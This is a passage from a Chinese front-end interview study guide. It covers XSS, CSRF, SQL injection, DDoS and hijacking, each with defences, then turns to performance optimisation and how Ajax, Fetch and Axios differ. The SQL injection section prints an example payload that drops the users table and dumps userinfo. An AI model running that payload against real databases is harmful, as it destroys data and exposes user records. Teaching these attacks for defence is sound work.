  > 前端过滤无法阻挡攻击者直接向后端发送请求
  > 后端过滤无法保证输入与输出的效果一致
- 设置 httpOnly 属性，禁止 js 访问某些敏感的 cookie
- 设置 CSP（Content Security Policy）策略，限制加载资源的域名
- 设置 X-XSS-Protection 响应头，开启浏览器的 XSS 过滤功能
- 控制浏览器的输出，如避免使用不安全的 innerHTML、outerHTML 等，vue，react 中的 v-html，dangerouslySetInnerHTML 等，替代方案：innerText、textContent（推荐）。

### Q2: CSRF 攻击

CSRF (Cross Site Request Forgery) 跨站请求伪造，是指攻击者通过伪装成受信任用户的请求来利用受信任的网站。

攻击过程

- 用户登录受信任网站 A，并保留了登录凭证（如 Cookie）
- 攻击者引诱用户(如通过邮件发送给了用户)访问了危险网站 B
- 网站 B 向网站 A 发送了一个请求：`http://a.com/act=xx`
- 浏览器会默认携带网站 A 的 Cookie
- 网站 A 并不知道该请求是由攻击者发起的，所以会根据用户的 Cookie 执行该请求
- 攻击完成，攻击者在用户不知情的情况下，冒充用户，让网站 A 执行了自己定义的操作

特点

- 攻击一般发起在`第三方网站`，而不是被攻击的网站。被攻击的网站无法防止攻击发生
- 攻击利用受害者在被攻击网站的登录凭证，冒充受害者提交操作；而不是直接窃取数据
- 整个过程攻击者并不能获取到受害者的登录凭证，仅仅是“冒用”
- 跨站请求可以用各种方式：图片 URL、超链接、CORS、Form 提交等等。部分请求方式可以直接嵌入在第三方论坛、文章中，难以进行追踪

**防御**

- 服务端进行同源检测
- 提交时携带 token, 服务端进行验证
  > 用户打开页面时，从服务端获取到 token,并存储在本地。并随每次的请求一起提交给服务端，服务端进行校验。

### Q3: SQL 注入攻击

SQL 注入攻击是指攻击者通过把 SQL 命令插入到 Web 表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的 SQL 命令。

例如对于查询用户信息的 SQL 语句：

```sql
-- a 为web端输入的值
SELECT * FROM users WHERE name = 'a'
```

攻击方式是将 a 的值调整为恶意的值，如 `a';DROP TABLE users; SELECT * FROM userinfo WHERE 't' = 't';`

```sql
SELECT * FROM users WHERE name = 'a';DROP TABLE users; SELECT * FROM userinfo WHERE 't' = 't';
```

这样在 SQL 解析后就成为了上面的语句，删除了 users 表, 并查询了是所有的 userinfo。

**防御**

- 严格检查输入变量的类型和格式
- 过滤和转义特殊字符
- 对访问数据库的 Web 应用程序采用 Web 应用防火墙
- 后端采用一些第三方库，如 Java 的 Mybatis, NodeJs 的 prisma, 对执行的 SQL 语句进行过滤。

### 其他攻击方式

- DDOS()

  往指定站点发送海量的流量请求，使其正常请求瘫痪，并耗尽目标的资源。

  防御：服务端设置黑白名单。

- 劫持

  通过抓包工具抓取 http 请求，并获取明文数据。如密码，token 等。后续模仿请求攻击。

  防御: 使用 https 安全协议，防止明文请求。

# 23. 前端性能优化

- 加载或内容呈现性能优化

  - 资源响应速度
    - 使用 CDN 加速：增加并发连接和长缓存来加速下载静态资源。
    - 开启 gzip 压缩：减小资源体积。
    - 浏览器缓存：利用浏览器缓存（强缓存与协商缓存）与 Nginx 代理层缓存，缓存静态资源。
    - 减少网络请求次数和体积：合并文件、雪碧图、字体图标、base64 等。
    - 使用 HTTP2.0：多路复用、头部压缩、服务器推送等。
  - 资源体积优化
    - 代码压缩：去除空格、注释、简化代码、混淆代码等。
    - JS 体积优化方案
      - Tree-Shaking：去除无用代码。
      - Code Splitting：代码分割。
      - 组件按需加载
      - 代码按需打包
    - CSS 体积优化方案
      - 压缩 CSS 代码（mini-css-extract-plugin）
      - 使用 tailwindcss 库
      - 减少不必要的 css 前缀不全
    - 图片体积优化方案
      - 去掉不必要的图片，用样式代替图片
      - 雪碧图（HTTP/2 以上不需要雪碧图）
      - 压缩图片大小限制
      - 压缩项目静态图片
      - 使用 webp 格式图片（考虑浏览器兼容问题）
  - 资源加载顺序
    - css 放在 header 中，js 放在 body 底部。
    - 使用 preload、prefetch 等预加载技术。
      > preload：用于指定页面加载后即将用到的资源，如字体、js、css 等。
      > prefetch：用于指定页面加载后可能用到的资源，如下一页的资源。
    - 使用 defer、async 等异步加载技术。
      > defer：在 DOMContentLoaded 事件之前执行。
      > async：在加载完成后立即执行。
  - 代码质量
    - 使用 ES6
    - 使用正则代替一些复杂的 JS 校验或者匹配功能
    - 合理使用位运算符
    - 去除无效代码
    - 公共组件或函数封装
    - 减少嵌套循环
    - 使用高性能算法处理复杂功能

- 交互性能优化

  - 操作响应速度
    - 减少事件绑定
    - 事件委托
    - 防抖与节流
    - 使用 web worker
    - 使用 IntersectionObserver
    - 使用 requestIdleCallback
  - 减少重绘与回流
    - 减少 DOM 操作
    - 使用 CSS3 动画代替 JS 动画
    - 使用 transform 代替 top、left 等定位属性
    - 使用 flexbox 布局代替 float 布局
    - 使用 requestAnimationFrame 代替 setTimeout、setInterval
    - 使用虚拟 DOM
  - 交互体验
    - 使用动画效果友好过渡

## 24. Ajax, Fetch, Axios 的区别

Ajax, Fetch, Axios 3 者都是用来发送请求的，区别如下：

- Ajax

  - Ajax 是一种在无需重新加载整个网页的情况下，能够更新部分网页的技术，是一个技术统称，一个`概念`。
  - 常说的 ajax 请求是基于 `XMLHttpRequest` 对象实现异步请求的一种方式。

  ```js
  function ajax(url, callback) {
    const xhr = new XMLHttpRequest();
    xhr.open("GET", url);
    xhr.onreadystatechange = function () {
      if (xhr.readyState === 4 && xhr.status === 200) {
        callback(xhr.responseText);
      }
    };
    xhr.send();
  }

  ajax("https://smallpig.site/api/category/getCategory", function (res) {
    console.log(res);
  });
  ```

  - 存在回调地狱问题
  - XMLHttpRequest 只支持 Web 端，不支持 Node。
  - XMLHttpRequest 支持请求取消、请求进度功能。

- Fetch

  - Fetch 是基于 Promise 实现的，是一个标准的 API,一个`函数`。
  - 链式调用，解决了回调地狱问题。
  - Web 端与 Node 端都可以使用。
  - `不支持请求取消、请求进度`功能。

- Axios

  - Axios 是基于 Promise 实现的，是一个`第三方库`。
  - 其 Web 端基于 XMLHttpRequest 实现，Node 端基于 http 实现。
  - 链式调用，解决了回调地狱问题。
  - 支持请求取消、请求进度、请求防御、请求拦截、请求转换等功能。
